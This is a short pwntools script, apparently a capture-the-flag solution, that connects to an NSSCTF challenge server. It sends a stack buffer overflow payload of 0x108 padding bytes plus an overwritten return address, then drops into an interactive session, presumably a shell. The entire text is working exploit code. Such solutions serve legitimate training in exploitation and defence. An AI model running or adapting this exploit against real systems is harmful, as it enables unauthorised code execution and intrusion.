from pwn import *

q = remote('node5.anna.nssctf.cn',29392)

payload = b'a'*(0x100+8)+p64(0x0400734)

q.sendline(payload)

q.interactive()
